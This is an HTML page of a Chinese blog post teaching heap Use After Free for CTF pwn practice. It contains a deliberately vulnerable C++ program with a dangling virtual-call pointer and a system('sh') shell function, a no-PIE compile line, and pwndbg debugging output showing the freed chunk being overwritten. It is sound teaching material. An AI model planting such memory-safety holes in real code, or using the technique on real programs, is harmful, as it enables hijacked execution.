@@ -1,0 +1,1392 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x00：前言读了大佬推荐的Linux内存管理文章，感觉多多少少了解了一些Linux下堆的管理，前段时间一直在学Windows内核，现在又来恶补Linux，菜是原罪，话不多说，这里我就记录一下堆溢出中最简单的题目 0x01：漏洞介绍Glibc Heap 利用中，Use After Free(UAF)是很常见的一种，那么什么是UAF呢？ 简单的说，Use After Free 就是其字面所表达的意思">
+<meta name="keywords" content="Use After Free">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Use After Free">
+<meta property="og:url" content="http://yoursite.com/2019/03/04/Use-After-Free/index.html">
+<meta property="og:site_name" content="Thunder_J">
+<meta property="og:description" content="0x00：前言读了大佬推荐的Linux内存管理文章，感觉多多少少了解了一些Linux下堆的管理，前段时间一直在学Windows内核，现在又来恶补Linux，菜是原罪，话不多说，这里我就记录一下堆溢出中最简单的题目 0x01：漏洞介绍Glibc Heap 利用中，Use After Free(UAF)是很常见的一种，那么什么是UAF呢？ 简单的说，Use After Free 就是其字面所表达的意思">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-10T15:25:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Use After Free">
+<meta name="twitter:description" content="0x00：前言读了大佬推荐的Linux内存管理文章，感觉多多少少了解了一些Linux下堆的管理，前段时间一直在学Windows内核，现在又来恶补Linux，菜是原罪，话不多说，这里我就记录一下堆溢出中最简单的题目 0x01：漏洞介绍Glibc Heap 利用中，Use After Free(UAF)是很常见的一种，那么什么是UAF呢？ 简单的说，Use After Free 就是其字面所表达的意思">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Thunder_J" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/04/Use-After-Free/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Use After Free | Thunder_J</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Thunder_J</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Just for fun</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/04/Use-After-Free/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Thunder_J">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Thunder_J">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Use After Free
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+		
+		
+
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-04 11:48:37" itemprop="dateCreated datePublished" datetime="2019-03-04T11:48:37+08:00">2019-03-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-10 23:25:44" itemprop="dateModified" datetime="2019-09-10T23:25:44+08:00">2019-09-10</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/题目篇/" itemprop="url" rel="index"><span itemprop="name">题目篇</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/题目篇/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/题目篇/PWN/堆/" itemprop="url" rel="index"><span itemprop="name">堆</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">17k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">15 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>读了大佬推荐的Linux内存管理文章，感觉多多少少了解了一些Linux下堆的管理，前段时间一直在学Windows内核，现在又来恶补Linux，菜是原罪，话不多说，这里我就记录一下堆溢出中最简单的题目</p>
+<h1 id="0x01：漏洞介绍"><a href="#0x01：漏洞介绍" class="headerlink" title="0x01：漏洞介绍"></a>0x01：漏洞介绍</h1><p>Glibc Heap 利用中，Use After Free(UAF)是很常见的一种，那么什么是UAF呢？</p>
+<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
+</ul>
+<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
+<h1 id="0x02：例子"><a href="#0x02：例子" class="headerlink" title="0x02：例子"></a>0x02：例子</h1><h2 id="Example-One"><a href="#Example-One" class="headerlink" title="Example One"></a>Example One</h2><p>首先创建一个UAF.cpp，内容如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"class A"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"class B"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    A *p = <span class="keyword">new</span> B();</span><br><span class="line">    <span class="keyword">delete</span> p;       <span class="comment">//删除堆p</span></span><br><span class="line">    fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line"></span><br><span class="line">    p-&gt;print();     <span class="comment">//继续使用p，触发漏洞，程序会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ use_after_free.cpp -o use_after_free -g -w -no-pie</span><br></pre></td></tr></table></figure></p>
+<p>运行结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# ./UAF</span><br><span class="line">aaaa</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure></p>
+<p>为什么错误呢？原因很简单，我们之前已经释放过p了，现在又来调用当然会错误，现在我们动态调试一下。<br>首先我们需要在main函数下个断点，然后单步观察<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0x400863: file UAF.cpp, line 32.</span><br></pre></td></tr></table></figure></p>
+<p>我们运行到delete p的地方<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">34        delete p;       //删除堆p</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RBX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RCX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RDX  0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RDI  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x7ffff7a488c0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x602010 ◂— 0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdfe0 —▸ 0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RIP  0x4008a1 (main+71) ◂— mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4008a1 &lt;main+71&gt;     mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">   0x4008a5 &lt;main+75&gt;     mov    esi, 8</span><br><span class="line">   0x4008aa &lt;main+80&gt;     mov    rdi, rax</span><br><span class="line">   0x4008ad &lt;main+83&gt;     call   0x400720</span><br><span class="line"> </span><br><span class="line">   0x4008b2 &lt;main+88&gt;     mov    rax, qword ptr [rip + 0x2007b7] &lt;0x601070&gt;</span><br><span class="line">   0x4008b9 &lt;main+95&gt;     mov    rdx, rax</span><br><span class="line">   0x4008bc &lt;main+98&gt;     mov    esi, 0x400</span><br><span class="line">   0x4008c1 &lt;main+103&gt;    lea    rdi, [rip + 0x2007b8] &lt;0x601080&gt;</span><br><span class="line">   0x4008c8 &lt;main+110&gt;    call   fgets@plt &lt;0x400740&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008cd &lt;main+115&gt;    lea    rdi, [rip + 0x2007ac] &lt;0x601080&gt;</span><br><span class="line">   0x4008d4 &lt;main+122&gt;    call   strdup@plt &lt;0x400750&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/Thunder_J/桌面/UAF.cpp</span><br><span class="line">   29 </span><br><span class="line">   30 int main()</span><br><span class="line">   31 &#123;</span><br><span class="line">   32     setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">   33     A *p = new B();</span><br><span class="line"> ► 34     delete p;       //删除堆p</span><br><span class="line">   35     fgets(buf,sizeof(buf),stdin);</span><br><span class="line">   36     char *q = strdup(buf);</span><br><span class="line">   37 </span><br><span class="line">   38     p-&gt;print();     //继续使用p，触发漏洞，程序会报错</span><br><span class="line">   39     return 0;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdfe0 —▸ 0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line">01:0008│      0x7fffffffdfe8 —▸ 0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line">02:0010│      0x7fffffffdff0 —▸ 0x7fffffffe0e0 ◂— 0x1</span><br><span class="line">03:0018│      0x7fffffffdff8 ◂— 0x0</span><br><span class="line">04:0020│ rbp  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│      0x7fffffffe008 —▸ 0x7ffff767cb97 (__libc_start_main+231) ◂— mov    edi, eax</span><br><span class="line">06:0030│      0x7fffffffe010 ◂— 0xffffffffffffff90</span><br><span class="line">07:0038│      0x7fffffffe018 —▸ 0x7fffffffe0e8 —▸ 0x7fffffffe412 ◂— 0x73782f656d6f682f ('/home/xs')</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           4008a1 main+71</span><br><span class="line">   f 1     7ffff767cb97 __libc_start_main+231</span><br></pre></td></tr></table></figure></p>
+<p>我们查看堆情况<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap p</span></span><br><span class="line">0x613e70 &#123;</span><br><span class="line">  mchunk_prev_size = 6294984, </span><br><span class="line">  mchunk_size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0xf181, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据p我们查看一下chunk指向的内容<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x613e70-16</span></span><br><span class="line">0x613e60:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x613e70:	0x0000000000600dc8	0x0000000000000000</span><br><span class="line">0x613e80:	0x0000000000000000	0x000000000000f181</span><br><span class="line">0x613e90:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ea0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613eb0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ec0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ed0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ee0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ef0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x0000000000600dc8</span></span><br><span class="line">0x600dc8 &lt;_ZTV1B+16&gt;:	0x0000000000400918	0x0000000000000000</span><br><span class="line">0x600dd8 &lt;_ZTV1A+8&gt;:	0x0000000000600e00	0x00000000004008fc</span><br><span class="line">0x600de8 &lt;_ZTI1B&gt;:	0x00007ffff7dc7438	0x0000000000400a17</span><br><span class="line">0x600df8 &lt;_ZTI1B+16&gt;:	0x0000000000600e00	0x00007ffff7dc67f8</span><br><span class="line">0x600e08 &lt;_ZTI1A+8&gt;:	0x0000000000400a1a	0x0000000000000001</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x0000000000400918</span></span><br><span class="line">0x400918 &lt;B::print()&gt;:	0x10ec8348e5894855	0xe13d8d48f87d8948</span><br><span class="line">0x400928 &lt;B::print()+16&gt;:	0xfffffe00e8000000	0xe589485590c3c990</span><br><span class="line">0x400938 &lt;A::A()+4&gt;:	0x9d158d48f87d8948	0x48f8458b48002004</span><br><span class="line">0x400948 &lt;A::A()+20&gt;:	0x485590c35d901089	0x894810ec8348e589</span><br><span class="line">0x400958 &lt;B::B()+10&gt;:	0x8948f8458b48f87d	0x8d48ffffffcee8c7</span><br></pre></td></tr></table></figure></p>
+<p>可以看到最终指向的地址是B中的print()函数，我们继续单步直到p-&gt;print()处，也就是漏洞触发之后，再次查看此内存<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x613e70-16</span></span><br><span class="line">0x613e60:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x613e70:	0x6665656264616564	0x000000000000000a</span><br><span class="line">0x613e80:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x613e90:	0x6665656264616564	0x000000000000000a</span><br><span class="line">0x613ea0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
